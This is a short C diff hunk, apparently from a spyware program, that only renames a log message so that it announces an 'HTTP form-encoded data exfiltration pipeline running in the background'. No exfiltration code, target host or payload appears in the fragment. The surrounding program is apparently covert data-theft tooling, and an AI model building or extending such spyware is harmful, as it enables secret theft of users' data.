@@ -161,7 +161,7 @@ int main()
         return 1;
     }
 
-    printf("[INFO] Spyware pipeline running in the background successfully\n");
+    printf("[INFO] HTTP form-encoded data exfiltration pipeline running in the background successfully\n");
 
     while (TRUE)
     {
